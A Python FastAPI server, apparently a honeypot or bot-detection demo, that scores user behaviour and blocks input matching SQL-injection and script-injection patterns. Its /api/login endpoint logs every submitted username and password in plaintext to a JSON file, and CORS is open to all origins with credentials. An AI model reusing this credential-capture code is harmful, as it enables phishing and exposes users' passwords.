import json
from datetime import datetime
import uvicorn
import re
from fastapi import FastAPI, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional, Dict, Any

app = FastAPI(title="Cortex X Kernel")

# 1. CORS Setup
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# 2. Data Models
class BehavioralEvent(BaseModel):
    event_type: str
    dwell_time: Optional[float] = 0.0
    mouse_velocity: Optional[float] = 0.0
    input_text: Optional[str] = ""
    honeypot_triggered: bool = False

# --- NEW: Model for Login Data ---
class LoginRequest(BaseModel):
    username: str
    password: str

# 3. Analysis Logic
class RiskEngine:
    def __init__(self):
        self.risk_score = 0.0
        self.syntax_patterns = [
            r"(?i)select\s+\*", r"(?i)drop\s+table", r"(?i)<script>", 
            r"(?i)union\s+select", r"(?i)OR\s+1=1"
        ]

    def evaluate(self, data: BehavioralEvent) -> dict:
        risk_increment = 0.0
        reason = "Normal Behavior"

        if data.honeypot_triggered:
            return {"status": "BLOCK", "score": 10.0, "reason": "CRITICAL: HONEYPOT TRIGGERED"}

        if data.event_type == "keystroke":
            if data.dwell_time < 45:
                risk_increment = 2.0
                reason = f"Bot-like Speed ({data.dwell_time}ms)"

        if data.event_type == "mouse":
            if data.mouse_velocity > 15.0:
                risk_increment = 1.5
                reason = "High Velocity Mouse Movement"

        if data.input_text:
            for pattern in self.syntax_patterns:
                if re.search(pattern, data.input_text):
                    return {"status": "BLOCK", "score": 9.5, "reason": "MALICIOUS SYNTAX INJECTION"}

        if data.event_type == "paste":
            risk_increment = 2.5
            reason = "Clipboard Injection Attempt"
        
        if data.event_type == "focus_loss":
            risk_increment = 1.0
            reason = "Focus Integrity Lost"

        current_risk = risk_increment
        verdict = "ALLOW"
        if current_risk >= 8.5:
            verdict = "BLOCK"
        
        return {"status": verdict, "score": current_risk, "reason": reason if risk_increment > 0 else None}

engine = RiskEngine()

# 4. API Endpoints
@app.post("/api/analyze")
async def analyze_behavior(event: BehavioralEvent):
    result = engine.evaluate(event)
    return result

# --- NEW: Capture Credentials Endpoint ---
@app.post("/api/login")
async def capture_credentials(data: LoginRequest):
    file_path = "captured_credentials.json"
    
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "username": data.username,
        "password": data.password, 
        "ip_address": "127.0.0.1" 
    }

    try:
        with open(file_path, "r") as f:
            logs = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logs = []

    logs.append(entry)
    with open(file_path, "w") as f:
        json.dump(logs, f, indent=4)

    return {"status": "CAPTURED", "message": "Credentials logged"}

# 5. Serve Frontend
app.mount("/", StaticFiles(directory="public", html=True), name="public")

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)